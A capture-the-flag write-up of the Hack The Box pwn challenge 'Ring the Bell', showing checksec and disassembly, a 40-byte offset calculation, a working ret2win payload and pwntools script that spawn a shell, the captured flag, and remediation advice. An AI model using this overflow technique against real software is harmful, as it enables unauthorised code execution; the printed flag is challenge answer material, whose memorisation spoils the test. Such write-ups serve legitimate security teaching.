# HTB Pwn Challenge — "Ring the Bell" — Writeup

**Target:** `154.57.164.77:30625` (assigned instance)
**Category:** Pwn / Binary Exploitation (Stack Buffer Overflow → ret2win)
**Stack:** ELF 64-bit LSB Executable, dynamically linked, Full RELRO, No PIE

---

## Summary

`ring_the_bell` presents a dialogue asking the user to enter a bell pattern
to "call for reinforcements." The binary is vulnerable to a classic
**stack buffer overflow** in `main`: input is read via `read()` into a
32-byte local buffer, but the read is capped at 96 bytes — no bounds
checking. With no stack canary and no PIE, the fixed return address on the
stack can be overwritten directly to redirect execution to a hidden
`bell()` function that calls `execl("/bin/sh", "sh", NULL)`, spawning a
shell. This is a textbook **ret2win**: no shellcode injection, no ROP
chain, no leaks required — just overwrite the saved RIP with the address
of a function the binary already contains.

---

## Vulnerability Analysis

### 1. Check security mitigations
```bash
file ring_the_bell
checksec --file=ring_the_bell
```
```
ring_the_bell: ELF 64-bit LSB executable, x86-64, ... dynamically linked ...
RELRO           STACK CANARY      NX            PIE
Full RELRO      No canary found   NX enabled    No PIE
```
- **No PIE** → all function addresses are fixed/constant across runs.
- **No stack canary** → return address overwrites go undetected.
- **NX enabled** → doesn't matter here; we redirect to existing executable
  code in the binary rather than injecting shellcode onto the stack.

### 2. Disassemble `main`
```bash
objdump -d ring_the_bell | grep -A 30 '<main>:'
```
Relevant portion:
```asm
40179b <main>:
  ...
  4017a3: sub    $0x20,%rsp          ; 32-byte stack frame
  ...
  4017f9: lea    -0x20(%rbp),%rax    ; buffer = rbp-0x20
  4017fd: mov    $0x60,%edx          ; size = 0x60 (96) bytes
  401802: mov    %rax,%rsi
  401805: mov    $0x0,%edi           ; fd = 0 (stdin)
  40180a: call   401150 <read@plt>
```
- Buffer is allocated at `rbp - 0x20` → **32 bytes** of usable space.
- `read()` accepts up to **96 bytes** from stdin into that 32-byte buffer.
- `96 > 32` → clear overflow, enough to overwrite saved RBP and the return
  address.

### 3. Stack layout / offset calculation
From the buffer at `rbp - 0x20` up to and past the return address:
1. Fill the 32-byte local buffer: `rbp - 0x20` → `rbp` = **32 bytes**
2. Overwrite saved `rbp`: **8 bytes**
3. Reach the return address (`rbp + 8`): next **8 bytes**

**Total offset to return address = 32 + 8 = 40 bytes.**

### 4. Locate the win function
```bash
objdump -d ring_the_bell | grep -A 15 '<bell>:'
```
```asm
40176d <bell>:
  401775: mov    $0x0,%edx
  40177a: lea    0x8de(%rip),%rax   ; "sh"
  401781: mov    %rax,%rsi
  401784: lea    0x8d7(%rip),%rax   ; "/bin/sh"
  40178b: mov    %rax,%rdi
  401793: call   401190 <execl@plt> ; execl("/bin/sh", "sh", NULL)
```
`bell()` at `0x40176d` directly spawns a shell — a ready-made "win"
gadget, no ROP chain construction needed.

---

## Exploitation Walkthrough

### 1. Payload
- 40 bytes of padding (e.g. `A`s) to fill buffer + saved RBP
- 8-byte little-endian address of `bell`: `\x6d\x17\x40\x00\x00\x00\x00\x00`

### 2. Quick manual test (local)
```bash
(python3 -c "import sys; sys.stdout.buffer.write(b'A'*40 + b'\x6d\x17\x40\x00\x00\x00\x00\x00')"; cat) | ./ring_the_bell
```
The trailing `; cat` keeps stdin open after the payload is sent, so the
spawned shell doesn't immediately die on EOF — this is what makes it
interactive from a plain shell pipeline.

Confirmed working locally: process drops into `sh`, `whoami` returns the
local user.

### 3. Pwntools exploit script
```python
from pwn import *

elf = context.binary = ELF('./ring_the_bell')

local = False
if local:
    io = process('./ring_the_bell')
else:
    io = remote('154.57.164.77', 30625)   # use your actual assigned host:port

payload = flat({
    40: elf.symbols['bell']
})

io.sendlineafter(b"[Rin]:", payload)
io.interactive()
```

Run:
```bash
python3 exploit.py
```

Confirmed against both local and remote instances — remote drops into an
interactive shell as expected.

### 4. Grab the flag
```bash
$ ls
$ cat flag.txt
```

## Flag
```
HTB{R1ng4_R1ng4_R1111111nG_ee6f27fedf38063158e674c943ac347c}
```

---

## Remediation

1. **Bounds-check input reads** — cap `read()` at the actual buffer size:
   ```c
   char buffer[32];
   read(0, buffer, sizeof(buffer));
   ```
2. **Enable stack canaries** — compile with `-fstack-protector-all` so
   overflow attempts are detected before `main` returns.
3. **Enable PIE** — compile with `-fPIE -pie` so function addresses (like
   the `bell()` win-gadget here) are randomized per-run instead of fixed,
   removing the ability to hardcode target addresses.
4. **Remove/guard dangerous convenience functions** — a function that
   calls `execl("/bin/sh", ...)` should never be reachable in a
   production binary, gadget or not.

## Takeaways / patterns to remember

- **`checksec` first, always** — No PIE + no canary immediately signals
  "look for a direct RIP overwrite to a fixed address," before considering
  anything more advanced (ASLR bypass, leak-then-ROP, etc.).
- **`objdump -d` on `main` to find the exact buffer size vs. read size**
  is the fastest way to compute the offset precisely, rather than
  brute-forcing with cyclic patterns — worthwhile as a first check when
  the binary is small/unstripped like this one.
- **Look for a pre-built "win function" before reaching for a ROP chain.**
  CTF pwn binaries often include an intentionally-placed function (like
  `bell()` here) that directly grants a shell — check the symbol table
  (`nm`, or unstripped `objdump`) for anything calling `execve`/`execl`/
  `system` before assuming you need to chain gadgets manually.
- **`(payload; cat) | ./binary`** is a simple, reliable pattern for
  keeping stdin open after a raw payload to get a locally interactive
  shell without needing pwntools for a first manual test.
